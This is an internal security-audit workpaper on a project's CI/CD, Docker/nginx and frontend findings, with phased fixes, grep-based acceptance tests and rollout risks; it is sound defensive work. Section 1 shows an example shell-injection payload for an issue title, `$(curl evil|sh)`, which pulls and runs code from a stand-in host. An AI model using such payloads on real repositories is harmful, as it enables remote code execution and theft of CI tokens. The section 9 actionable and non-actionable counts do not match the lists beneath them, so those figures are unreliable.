# G3 — Frontend / Infra / CI-CD Residual Cluster

**Cluster owner:** G3_frontend_infra worker
**Members:** 45 findings across scopes `12-frontend`, `13-infra-deployment`, `14-ci-cd-workflows`
**Read-only contract:** This workpaper is written into `docs/audits/2026-04/_synthesis/workpaper/G3_frontend_infra.md`. No source code is modified by this synthesis pass.

---

## 1. Cluster overview

This cluster is the residual frontend + deployment + CI/CD bucket — everything in scopes 12/13/14 that is *not* already owned by clusters A (secret rotation), C (CSP / browser security headers handled separately), or F (frontend↔backend contract drift). It decomposes into three sub-themes:

### Sub-theme G3.A — CI/CD security (CRITICAL, top priority)
Three critical findings (F-14-001, F-14-002, F-14-003) plus a high (F-14-004) describe **remote-code-execution-in-CI** vectors live in `main`:

- **Shell-injection via untrusted issue / PR fields** (F-14-001, F-14-002): `issue-management.yml`, `auto-sync.yml`, `board-sync.yml`, `github-swarm.yml` interpolate `${{ github.event.issue.title }}` / `.body` / `.pull_request.body` directly into shell `run:` blocks. An external user filing an issue with `` `id` `` or `$(curl evil|sh)` in the title executes arbitrary shell with the workflow token's privileges.
- **TA-Lib downloaded over plaintext HTTP, no checksum** (F-14-003): 7+ workflows wget `http://prdownloads.sourceforge.net/...`, then `make install` as root. Trivial MITM → root-on-runner with the repo's `GITHUB_TOKEN`.
- **Floating major-tag actions** (F-14-004): zero third-party actions are pinned to a 40-char SHA. A Tj-actions-style supply-chain compromise lands instantly.
- **Workflows missing top-level `permissions:`** (F-14-006): legacy default `contents: write` magnifies blast radius of the above.

These together make the CI surface the single highest-severity area in the cluster. They MUST be addressed first because *fixing anything else first means the fix gets reviewed/built/deployed by an exploitable pipeline*.

### Sub-theme G3.B — Docker / production deployment (CRITICAL gating prod)
Three findings (F-13-001 critical, F-13-002, F-13-003 high) describe a fully broken production Docker build:

- `docker-compose.production.yml:121` references `target: runtime`, but the root `Dockerfile.backend` has unnamed builder/runtime stages (`AS runtime` does not exist).
- `docker-compose.dev.yml` references `target: development` (does not exist).
- `docker-compose.test.yml` references `target: test` (does not exist anywhere).

Production cannot deploy from a clean build. Dev and test compose are also broken. Additional infra findings cover bind-mount leaks into prod (F-13-006), nginx healthcheck mismatch (F-13-007), missing TLS material (F-13-008), HTTP MITM in TA-Lib (F-13-009), HuggingFace inline download in build (F-13-010), and conflicting nginx configs (F-13-011, F-13-012, F-13-013, F-13-016, F-13-017), plus minor Dockerfile hygiene (F-13-005, F-13-015, F-13-018, F-13-019).

### Sub-theme G3.C — Frontend residual (mostly type/dead-code)
14 findings in `12-frontend` that are NOT in cluster F (contract drift) or C (CSP). These are dead-code dupes (F-12-004, F-12-007, F-12-017), schema/type escapes (F-12-006, F-12-008, F-12-019), broken state access (F-12-009), unimplemented WS handler (F-12-012), perf/cleanup (F-12-013, F-12-021, F-12-022), test gap (F-12-014), architectural debt (F-12-018), and doc misplacement (F-12-020).

---

## 2. Member findings — all 45 IDs

### Scope 12-frontend (14)
| ID | Sev | Title (abbrev) |
|---|---|---|
| F-12-004 | high | Root-level CorrelationMatrix/EfficientFrontier/RiskDecomposition are dead duplicate code |
| F-12-006 | high | `PortfolioMetrics` interface missing analytics fields — escaped with `as any` |
| F-12-007 | high | Three dead production deps: react-beautiful-dnd, plotly.js, react-plotly.js |
| F-12-008 | high | Catch-block `err: any` leaks raw API error detail to UI |
| F-12-009 | high | WebSocket subscribes to non-existent `state.portfolio.watchlist?.items` path |
| F-12-012 | medium | `stock:trade` handler delegates to unimplemented `handleTradeUpdate` |
| F-12-013 | medium | Route prefetch `setTimeout` may state-update unmounted component |
| F-12-014 | medium | No tests for `api.service.ts`, `websocket.service.ts`, `api.config.ts` |
| F-12-017 | medium | `serviceWorkerRegistration.ts` exported but never called |
| F-12-018 | medium | No RTK Query — hand-rolled thunks, no dedup/cache |
| F-12-019 | low | `state.sortBy = action.payload.sortBy as any` in reducer |
| F-12-020 | low | Design `.md` inside `src/design/` not in `docs/` |
| F-12-021 | low | No `React.memo` on any page-level component |
| F-12-022 | low | `recentSearches` localStorage without TTL or size limit |

### Scope 13-infra-deployment (17)
| ID | Sev | Title (abbrev) |
|---|---|---|
| F-13-001 | **critical** | `target: runtime` references missing stage in Dockerfile.backend |
| F-13-002 | high | Dev compose `target: development` not defined |
| F-13-003 | high | Test compose `target: test` does not exist anywhere |
| F-13-005 | high | CNAME records point to placeholder + invalid target type |
| F-13-006 | high | Source bind-mounts in base compose leak into production |
| F-13-007 | high | nginx prod healthcheck hits `/nginx_status` on TLS server (404) |
| F-13-008 | high | `ssl_dhparam` and `ssl_trusted_certificate` reference files not in repo |
| F-13-009 | medium | TA-Lib downloaded via insecure `http://prdownloads.sourceforge.net` |
| F-13-010 | medium | Inline FinBERT download during image build (network-fragile, +500MB) |
| F-13-011 | medium | `RUN echo 'server {...}'` overwrites COPYed nginx.conf |
| F-13-012 | medium | Duplicate HTTP and HTTPS server blocks with full app routing |
| F-13-013 | medium | `location` blocks inside included security-headers file divergence |
| F-13-015 | medium | Inconsistent `version:` directive across compose files |
| F-13-016 | medium | nginx service in base compose duplicates production nginx |
| F-13-017 | medium | dev frontend env `VITE_API_URL` set at runtime, ineffective for built bundle |
| F-13-018 | low | Hard-coded `python3.12` site-packages path |
| F-13-019 | low | `npm ci --only=production` then `npm run build` |

### Scope 14-ci-cd-workflows (14)
| ID | Sev | Title (abbrev) |
|---|---|---|
| F-14-001 | **critical** | Script injection via untrusted issue title/body |
| F-14-002 | **critical** | Same injection pattern in 3 more workflows |
| F-14-003 | **critical** | TA-Lib over plaintext HTTP without checksum (7+ workflows) |
| F-14-004 | high | Third-party actions pinned only to floating major tags |
| F-14-005 | high | Two duplicate mypy workflows with conflicting configs |
| F-14-006 | high | Workflows missing top-level `permissions:` block |
| F-14-007 | high | Mixed CodeQL action versions (`@v2` and `@v3`) |
| F-14-008 | high | Python matrix wastes 3x compute (3.10/3.11/3.12) for one prod target |
| F-14-009 | medium | `reusable-build.yml` is never called |
| F-14-010 | medium | `codecov-action` uploads silently fail when `CODECOV_TOKEN` unset |
| F-14-011 | medium | Many backend-quality steps swallow exit codes with `|| true` |
| F-14-012 | medium | `additional_dependencies: [types-all]` in pre-commit is unmaintained |
| F-14-013 | medium | Doc shows single Python version; reality is mixed |
| F-14-014 | low | Apt cache step is non-functional (`/var/cache/apt`, no sudo) |

**Total = 45 findings.**

---

## 3. Sequenced fix steps

Sequencing is **strictly**: CI security → Docker build unblock → infra hardening → frontend cleanup. Rationale: every other fix flows through CI, and CI is currently exploitable. We do not want a rushed fix-PR to be the vehicle that an attacker rides.

### Phase 1 — CI/CD security (RCE-class, do FIRST)
1. **F-14-001, F-14-002** — Refactor every `${{ github.event.*.title|body|message|name }}` interpolation in `run:` blocks to `env:`-then-`"$VAR"` form. Apply to `issue-management.yml`, `auto-sync.yml`, `board-sync.yml`, `github-swarm.yml`. Add a repo-wide grep guard in CI.
2. **F-14-006** — Add `permissions: contents: read` at workflow top to all listed files; widen only the specific job that needs write.
3. **F-14-003** — Replace TA-Lib `wget http://prdownloads...` with `https://github.com/ta-lib/ta-lib/releases/download/<tag>/<file>` + `sha256sum -c`. Apply to all 7 workflows in one PR. (Mirrors F-13-009 fix on the Docker side.)
4. **F-14-004** — Pin all third-party actions to 40-char commit SHAs with trailing tag comment. Lean on existing `dependabot.yml:115` `github-actions` ecosystem to keep them current.
5. **F-14-007** — Bump all `codeql-action/upload-sarif@v2` to `@v3`.

### Phase 2 — Unblock production deployment
6. **F-13-001** (critical) — Add `AS runtime` (and `AS builder`) labels in root `Dockerfile.backend`, OR repoint `docker-compose.production.yml:121` to `infrastructure/docker/backend/Dockerfile.optimized` which already defines named stages. Decide: single canonical Dockerfile or remove the duplicate.
7. **F-13-002** — Same fix; add `AS development`.
8. **F-13-003** — Add `AS test` stage (pytest deps) OR reuse `runtime` and override CMD in compose only.
9. **F-13-006** — Production overlay must explicitly reset `volumes:` for backend/frontend services so dev bind-mounts don't leak. Acceptance test in §5.
10. **F-13-007** — Switch nginx prod healthcheck from `/nginx_status` to `/health` (already on both servers).
11. **F-13-019** — Drop `--only=production` from builder-stage `npm ci` (Vite + TS live in devDependencies).
12. **F-13-009** — Switch TA-Lib in `Dockerfile.backend:32` to GitHub HTTPS + checksum (mirror Phase 1.3).

### Phase 3 — Infra hardening
13. **F-13-008** — Provision `dhparam.pem` / `chain.pem` at deploy (init container or Makefile target), or remove `ssl_dhparam`/`ssl_trusted_certificate` if not needed.
14. **F-13-005** — Replace placeholder CNAMEs in `infrastructure/cdn/cloudflare_config.yaml` with templated vars, or move to Terraform.
15. **F-13-011** — Drop `RUN echo 'server {...}'` from `Dockerfile.frontend:36-66`; rely solely on COPYed `nginx.conf`.
16. **F-13-012** — Reduce HTTP server in `nginx.optimized.conf` to ACME challenge + 301 to HTTPS.
17. **F-13-013** — Consolidate `security-headers.conf` to one canonical file; reconsider `Cross-Origin-Embedder-Policy: require-corp`.
18. **F-13-016** — Remove duplicate nginx from base `docker-compose.yml`; let prod overlay own the LB.
19. **F-13-010** — Move FinBERT download out of build context; runtime init container or model registry.
20. **F-13-015**, **F-13-017**, **F-13-018** — Compose `version:` consistency, VITE arg/env documentation, soft-coded site-packages.
21. **F-14-005** — Delete `mypy.yml`; keep `type-check.yml`.
22. **F-14-008** — Reduce CI Python matrix to `['3.12']`; nightly-only for 3.10/3.11.
23. **F-14-009** — Wire `reusable-build.yml` into `workflow-coordinator.yml` or delete it.
24. **F-14-010** — Add CODECOV_TOKEN smoke-check warning step.
25. **F-14-011** — Replace `|| true`-guarded steps in `backend-quality` with parse-and-gate (mirror `backend-security`).
26. **F-14-012** — Replace `types-all` in `.pre-commit-config.yaml:8` with explicit stub list.
27. **F-14-013** — Refresh `docs/GITHUB_WORKFLOWS.md` to match consolidated matrix.
28. **F-14-014** — Remove or migrate apt-cache step to a maintained action.

### Phase 4 — Frontend residual (low blast radius, parallel-safe)
29. **F-12-004** — Delete root-level `CorrelationMatrix.tsx`, `EfficientFrontier.tsx`, `RiskDecomposition.tsx` (byte-identical dupes of `portfolio/` versions).
30. **F-12-007** — Remove `react-beautiful-dnd`, `plotly.js`, `react-plotly.js` (+ `@types/*`) from `frontend/web/package.json`.
31. **F-12-006** — Extend `PortfolioMetrics` with typed optional fields (`correlationMatrix`, `efficientFrontier`, `diversificationScore`); strip `as any`.
32. **F-12-008** — Replace `err: any` in `InvestmentThesis.tsx:169` with `err: unknown` + axios typed handler; never display 500-level `detail`.
33. **F-12-009** — Fix `state.portfolio.watchlist?.items` to `state.portfolio.selectedWatchlist?.items ?? []` in `websocket.service.ts:144`.
34. **F-12-012** — Implement `handleTradeUpdate(data: unknown): void` in `websocket.service.ts`.
35. **F-12-014** — Add vitest unit coverage for `api.service.ts`, `websocket.service.ts`, `api.config.ts` (auth interceptor, refresh, WS reconnect).
36. **F-12-017** — Either call `serviceWorkerRegistration.register()` from `index.tsx` or delete the file.
37. **F-12-019** — Define `SortBy` union; remove `as any` in `recommendationsSlice.ts:163`.
38. **F-12-020** — Move `src/design/PORTFOLIO_DASHBOARD_DESIGN.md` to `docs/design/`.
39. **F-12-022** — Slice `recentSearches` to ≤10 entries; optional `savedAt` TTL.
40. **F-12-013**, **F-12-021** — Optional perf hygiene; consider `requestIdleCallback` and `React.memo` on stable pages.
41. **F-12-018** — Architectural; defer to roadmap (RTK Query migration ≥ 12h).

---

## 4. Files touched

### CI / workflows
- `.github/workflows/issue-management.yml`
- `.github/workflows/auto-sync.yml`
- `.github/workflows/board-sync.yml`
- `.github/workflows/github-swarm.yml`
- `.github/workflows/ci.yml`
- `.github/workflows/comprehensive-testing.yml`
- `.github/workflows/daily-pipeline-validation.yml`
- `.github/workflows/dependency-updates.yml`
- `.github/workflows/production-deploy.yml`
- `.github/workflows/reusable-test.yml`
- `.github/workflows/security-scan.yml`
- `.github/workflows/cleanup.yml`
- `.github/workflows/documentation-sync.yml`
- `.github/workflows/migration-check.yml`
- `.github/workflows/automated-release.yml`
- `.github/workflows/mypy.yml` *(delete)*
- `.github/workflows/type-check.yml`
- `.github/workflows/performance-monitoring.yml`
- `.github/workflows/reusable-build.yml`
- `.github/workflows/reusable-build.yml` *(or delete)*
- `.github/workflows/pr-automation.yml`
- `.github/workflows/monitoring-notifications.yml`
- `.github/workflows/workflow-coordinator.yml`
- `.pre-commit-config.yaml`

### Docker / compose / nginx
- `Dockerfile.backend`
- `Dockerfile.frontend`
- `docker-compose.yml`
- `docker-compose.dev.yml`
- `docker-compose.test.yml`
- `docker-compose.production.yml`
- `docker-compose.ml-production.yml` (compose `version:` consistency)
- `infrastructure/docker/backend/Dockerfile.optimized`
- `infrastructure/docker/frontend/nginx.optimized.conf`
- `infrastructure/docker/frontend/security-headers.conf`
- `infrastructure/docker/nginx/nginx.conf`
- `infrastructure/docker/nginx/nginx-ssl.conf`
- `infrastructure/cdn/cloudflare_config.yaml`

### Frontend (`frontend/web/`)
- `frontend/web/package.json`
- `frontend/web/src/components/CorrelationMatrix.tsx` *(delete)*
- `frontend/web/src/components/EfficientFrontier.tsx` *(delete)*
- `frontend/web/src/components/RiskDecomposition.tsx` *(delete)*
- `frontend/web/src/store/slices/portfolioSlice.ts`
- `frontend/web/src/store/slices/recommendationsSlice.ts`
- `frontend/web/src/services/websocket.service.ts`
- `frontend/web/src/services/api.service.ts`
- `frontend/web/src/config/api.config.ts`
- `frontend/web/src/pages/InvestmentThesis.tsx`
- `frontend/web/src/pages/Portfolio.tsx`
- `frontend/web/src/components/portfolio/PortfolioChart.tsx`
- `frontend/web/src/components/SearchModal/index.tsx`
- `frontend/web/src/serviceWorkerRegistration.ts` *(delete or wire up)*
- `frontend/web/src/index.tsx`
- `frontend/web/src/App.tsx`
- `frontend/web/src/design/PORTFOLIO_DASHBOARD_DESIGN.md` *(move to docs/design/)*
- New: `frontend/web/src/services/__tests__/api.service.test.ts`, `websocket.service.test.ts`, `api.config.test.ts`

### Docs
- `docs/GITHUB_WORKFLOWS.md`
- `docs/design/PORTFOLIO_DASHBOARD_DESIGN.md` (new home for the moved file)

---

## 5. Acceptance tests

### Phase 1 — CI security
- **AT-G3-1.1 (F-14-001/002):** `grep -nE '(TITLE|BODY|MESSAGE|NAME|TEXT)=\"\\\$\\{\\{ *github\\.event' .github/workflows/*.yml` returns 0.
- **AT-G3-1.2 (F-14-001 fuzz):** Re-run `issue-management.yml` against an issue with title `` `$(echo PWNED)` ``; the literal string is logged, no `PWNED` token appears.
- **AT-G3-1.3 (F-14-003):** `grep -E "wget http://prdownloads" .github/workflows/*.yml` returns 0; install step has `sha256sum -c`.
- **AT-G3-1.4 (F-14-004):** `grep -cE 'uses: [^@]+@[a-f0-9]{40}' .github/workflows/*.yml` ≥ count of `uses:` lines for non-`actions/*` and non-`./` references.
- **AT-G3-1.5 (F-14-006):** `grep -L '^permissions:' .github/workflows/*.yml` returns empty.
- **AT-G3-1.6 (F-14-007):** `grep 'codeql-action.*@v2' .github/workflows/*.yml` returns 0.

### Phase 2 — Docker
- **AT-G3-2.1 (F-13-001):** `docker compose -f docker-compose.yml -f docker-compose.production.yml build backend` succeeds; `docker build --target runtime -t test -f Dockerfile.backend .` succeeds.
- **AT-G3-2.2 (F-13-002):** `docker compose -f docker-compose.yml -f docker-compose.dev.yml build` succeeds.
- **AT-G3-2.3 (F-13-003):** `docker compose -f docker-compose.yml -f docker-compose.test.yml up --abort-on-container-exit backend` exits 0.
- **AT-G3-2.4 (F-13-006):** `docker compose -f docker-compose.yml -f docker-compose.production.yml config | grep -A3 'backend:' | grep -q './backend:/app/backend'` returns nothing.
- **AT-G3-2.5 (F-13-007):** `curl -fs http://localhost/health` inside `investment_nginx_prod` returns 200.
- **AT-G3-2.6 (F-13-009):** `grep -n 'http://prdownloads' Dockerfile.backend` returns 0.
- **AT-G3-2.7 (F-13-019):** `docker build -f Dockerfile.frontend .` succeeds without "vite: not found" or missing-tsc errors.

### Phase 3 — Infra hardening
- **AT-G3-3.1 (F-13-008):** `nginx -t` inside `investment_nginx_prod` returns "test is successful" once dhparam/chain are provisioned.
- **AT-G3-3.2 (F-13-005):** `grep -E 'yourdomain|your-server-ip' infrastructure/cdn/cloudflare_config.yaml` returns 0.
- **AT-G3-3.3 (F-13-012):** `curl -sI http://host/` returns `HTTP/1.1 301` with `Location: https://...`.
- **AT-G3-3.4 (F-13-015):** `docker compose -f docker-compose.yml -f docker-compose.production.yml config 2>&1 | grep -i 'version is obsolete'` returns 0.
- **AT-G3-3.5 (F-13-016):** `docker compose -f docker-compose.yml config | grep -c 'image: nginx'` is 0 in dev, 1 in prod.
- **AT-G3-3.6 (F-14-005):** `ls .github/workflows/{mypy,type-check}.yml` shows only `type-check.yml`.
- **AT-G3-3.7 (F-14-008):** `grep "python-version: \[" .github/workflows/ci.yml` returns single-element list.
- **AT-G3-3.8 (F-14-009):** `grep -rn 'uses: ./.github/workflows/reusable-build' .github/` returns ≥1 OR file no longer exists.
- **AT-G3-3.9 (F-14-011):** `grep -nE '(bandit|safety|pip-audit|mypy).*\|\| true' .github/workflows/ci.yml` in `backend-quality` job returns 0.
- **AT-G3-3.10 (F-14-012):** `pre-commit run --all-files mypy` succeeds in a clean cache.

### Phase 4 — Frontend
- **AT-G3-4.1 (F-12-004):** `vite build` completes; `find frontend/web/src/components -maxdepth 1 -name 'CorrelationMatrix.tsx' -o -name 'EfficientFrontier.tsx' -o -name 'RiskDecomposition.tsx'` returns 0.
- **AT-G3-4.2 (F-12-007):** `npm run build` completes; `du -sh frontend/web/dist/assets/plotly*` returns no files.
- **AT-G3-4.3 (F-12-006):** `tsc --noEmit` passes with no `as any` in `Portfolio.tsx`, `PortfolioChart.tsx`.
- **AT-G3-4.4 (F-12-008):** Unit test mocks 500 with `detail: 'SQL error: ...'`; UI displays generic fallback.
- **AT-G3-4.5 (F-12-009):** Add stock to watchlist → DevTools Network shows WS `subscribe` emission.
- **AT-G3-4.6 (F-12-012):** Mock socket emits `stock:trade`; no TypeError thrown.
- **AT-G3-4.7 (F-12-014):** `npm run test:coverage` shows `api.service.ts` and `websocket.service.ts` ≥ 80% branch coverage.
- **AT-G3-4.8 (F-12-019):** `tsc --noEmit` passes; no `as any` in `recommendationsSlice.ts`.
- **AT-G3-4.9 (F-12-020):** `find frontend/web/src -name '*.md'` returns no results.
- **AT-G3-4.10 (F-12-022):** Unit test stores 15 searches; localStorage value length ≤ 10.

---

## 6. Rollback plan

All changes are version-controlled; rollback = `git revert` of the per-phase PR. Specific notes:

- **Phase 1 (CI):** All workflow edits are file-only. Reverting the PR restores prior behavior. *Caveat:* SHA-pinned actions cannot be "un-broken" by rollback if the floating tag is later compromised; pinning is forward-only protection. Keep a copy of the pinned-SHA list in `docs/audits/2026-04/_synthesis/notes/G3_action_pins.md`.
- **Phase 2 (Docker):** Add named stages is purely additive. If a named-stage rename breaks something, revert the Dockerfile change; compose still references the old anonymous stage if we kept the original `AS` ordering. Recommend choosing the "repoint compose to `Dockerfile.optimized`" branch — it preserves both files unchanged and is rollback-safe.
- **Phase 2.4 (F-13-006 volumes reset):** Production volumes reset is observable in `docker compose config`; if rollback needed, restore the prior production overlay. No data is destroyed because we are *removing* a host bind-mount, not the underlying container path.
- **Phase 3 (nginx, dhparam):** dhparam generation is one-shot at deploy; rollback is removing the `ssl_dhparam` directive. Generating a fresh dhparam at deploy is idempotent.
- **Phase 4 (frontend):** All file deletions (F-12-004, F-12-007, F-12-017, F-12-020) are reversible from git history. Type-tightening (F-12-006, F-12-019) cannot regress at runtime — worst case is a build failure caught by `tsc --noEmit`.

**Single global rollback gate:** retain the prior tag `pre-G3-cluster` on `main` before merging Phase 1 PR, so any phase can `git revert` cleanly.

---

## 7. Dependencies

### Hard dependencies
- **None within G3.** Phases 1–4 inside the cluster are independently mergeable in the order given.

### Soft dependencies on other clusters
- **Cluster A (secret rotation):** Phase 1 (CI security) may touch CI secrets indirectly. If A is rotating `GITHUB_TOKEN`-equivalents or `CODECOV_TOKEN`, sequence A's rotation *after* G3 Phase 1 lands so the rotation happens through a secured pipeline.
- **Cluster C (CSP / browser headers):** F-13-013 touches the `security-headers.conf` consolidation; coordinate with C on the canonical CSP header set so G3 doesn't ship a competing version.
- **Cluster F (frontend↔backend contract drift):** F-12-006 (PortfolioMetrics typing) overlaps with cross_scope `09-analytics` and contract drift work in F. The schema changes should be co-merged; F owns the contract, G3 just types the client to it. F-12-008 (error detail leakage) is independent.

### Cross-scope references already noted in the slice
- F-12-014 → `15-test-suite` (G5)
- F-13-003 → `15-test-suite` (G5)
- F-13-005 → `16-config-secrets` (handled in A)
- F-13-008 → `17-scripts-tooling`
- F-13-010 → `03-ml-engine` (G2)
- F-13-013 → `08-auth-security-compliance`, `12-frontend`
- F-13-019 → `12-frontend` (self)
- F-14-001/002/006 → `08-auth-security-compliance`
- F-14-003 → `13-infra-deployment` (mirror of F-13-009)
- F-14-005, F-14-008, F-14-012 → `16-config-secrets`
- F-14-013 → `18-docs-health`

---

## 8. Effort & cost

Effort sums the `effort_hours` field on each finding (engineering-hour, single mid-level engineer).

| Phase | Findings | Hours |
|---|---|---:|
| 1 — CI security | F-14-001, 002, 003, 004, 006, 007 | 2+3+3+6+2+1 = **17** |
| 2 — Docker unblock | F-13-001, 002, 003, 006, 007, 009, 019 | 2+2+3+3+1+1+1 = **13** |
| 3 — Infra hardening | F-13-005, 008, 010, 011, 012, 013, 015, 016, 017, 018; F-14-005, 008, 009, 010, 011, 012, 013, 014 | 3+2+4+1+2+2+1+2+1+1+1+1+1+1+2+0.5+0.5+0.5 = **26.5** |
| 4 — Frontend residual | F-12-004, 006, 007, 008, 009, 012, 013, 014, 017, 018, 019, 020, 021, 022 | 0.5+2+0.5+1+2+1+1+8+0.5+12+0.5+0.25+4+0.5 = **33.75** |
| **Total** | **45 findings** | **≈ 90.25 engineering-hours** |

At a fully-loaded $150/hr blended rate that is ~$13,500. A two-engineer team can complete Phases 1+2 in 2 working days (≈30h) and the remainder in a 5–7 day stretch.

If F-12-018 (RTK Query migration, 12h) is deferred to roadmap, total drops to ~78h.

---

## 9. Loki-actionable

Per the `loki_actionable` flag on each finding:

**Loki-actionable (39):** F-12-004, F-12-006, F-12-007, F-12-008, F-12-009, F-12-012, F-12-014, F-12-017, F-12-019, F-12-020, F-12-021, F-12-022; F-13-001, F-13-002, F-13-003, F-13-006, F-13-007, F-13-009, F-13-011, F-13-012, F-13-015, F-13-016, F-13-018, F-13-019; F-14-001, F-14-002, F-14-003, F-14-004, F-14-005, F-14-006, F-14-007, F-14-009, F-14-010, F-14-011, F-14-012, F-14-013, F-14-014.

**Not Loki-actionable (6):** F-12-013 (judgement; "no urgent fix"), F-12-018 (architectural decision, RTK Query migration), F-13-005 (requires real domain decision + Terraform), F-13-008 (requires deploy-time secret/cert decision), F-13-010 (requires ML-team decision on model registry), F-13-013 (requires CSP/header policy decision), F-13-017 (documentation/policy), F-14-008 (matrix-vs-nightly is a policy call).

The CI security fixes (F-14-001/002 env-then-quote; F-14-003 URL+sha; F-14-004 SHA pinning; F-14-006 permissions block; F-14-007 v3 bump) are mechanical: pure regex/AST edits with deterministic acceptance tests. Loki can apply these unattended given the AT gates.

---

## 10. Rollout risks

### Phase 1 (CI security) — risks
- **In-flight workflow runs** may break mid-merge if a fork/branch references the prior workflow file syntax. Mitigation: merge during a low-traffic window; broadcast a "CI cooldown" notice; rely on GitHub's per-run snapshotting (existing runs use the workflow YAML as of the run start).
- **`permissions: contents: read` may break workflows that legitimately need write** (release, doc-sync). Track which jobs need write and grant `permissions:` *per-job*, not by reverting the workflow-level read.
- **SHA-pinning may freeze actions at a buggy version.** Mitigation: Dependabot is already configured (`.github/dependabot.yml:115`); confirm it bumps `github-actions` ecosystem and that PRs auto-create.
- **TA-Lib HTTPS+sha switch** can fail closed if checksum mismatches a future release; pin tag is required.

### Phase 2 (Docker) — risks
- **Production deploy gate.** F-13-001 fix is on the critical path: any error in named-stage refactor breaks `main` builds. Strongly prefer the "repoint compose to `Dockerfile.optimized`" branch — that file already has correct named stages, and the change is a one-line `dockerfile:` swap in compose.
- **F-13-006 volume reset** can surprise dev workflows that relied on prod-overlay loading host code. Communicate clearly that prod containers now run image code only.
- **F-13-007 healthcheck switch** has near-zero risk; `/health` already exists.
- **F-13-019 `--only=production` removal** marginally increases image build time and image size; acceptable.

### Phase 3 (infra hardening) — risks
- **F-13-008 dhparam/chain provisioning** must complete *before* nginx-ssl picks up the new directives — if not, nginx fails to start. Stage with feature flag or run nginx config test before reload.
- **F-13-012 (HTTP→HTTPS redirect)** breaks any client still on plain HTTP that doesn't follow redirects (rare). Acceptable.
- **F-13-013 (COEP)** changing `Cross-Origin-Embedder-Policy` may break embedded third-party widgets. Audit before flipping.

### Phase 4 (frontend) — risks
- **F-12-004 / F-12-007 dead-code deletion** is bundle-size-positive but watch for `grep` false negatives — do a `vite build` and a runtime smoke test before merging.
- **F-12-006 typing changes** are compile-time-only; no runtime risk. Watch for downstream files using `as any` against the same shape.
- **F-12-008 error message change** is user-facing; verify with QA that generic message is acceptable for non-500 cases too.
- **F-12-014 new tests** add CI runtime; budget ~30s.
- **F-12-018 (RTK Query)** is large enough that we recommend deferring out of this cluster entirely and tracking on the architecture roadmap.

### Cross-cutting risk
- The **same TA-Lib finding** appears at infra (F-13-009) and CI (F-14-003) layers. Fix them in **one coordinated PR** so the URL+checksum is identical in both Docker and CI.
- Cluster A's secret rotation should happen *through* a CI pipeline that has already absorbed Phase 1 fixes — sequencing matters.

---

**End of workpaper.**

**Final assertion:** This workpaper references all 45 cluster findings: F-12-004, F-12-006, F-12-007, F-12-008, F-12-009, F-12-012, F-12-013, F-12-014, F-12-017, F-12-018, F-12-019, F-12-020, F-12-021, F-12-022, F-13-001, F-13-002, F-13-003, F-13-005, F-13-006, F-13-007, F-13-008, F-13-009, F-13-010, F-13-011, F-13-012, F-13-013, F-13-015, F-13-016, F-13-017, F-13-018, F-13-019, F-14-001, F-14-002, F-14-003, F-14-004, F-14-005, F-14-006, F-14-007, F-14-008, F-14-009, F-14-010, F-14-011, F-14-012, F-14-013, F-14-014.
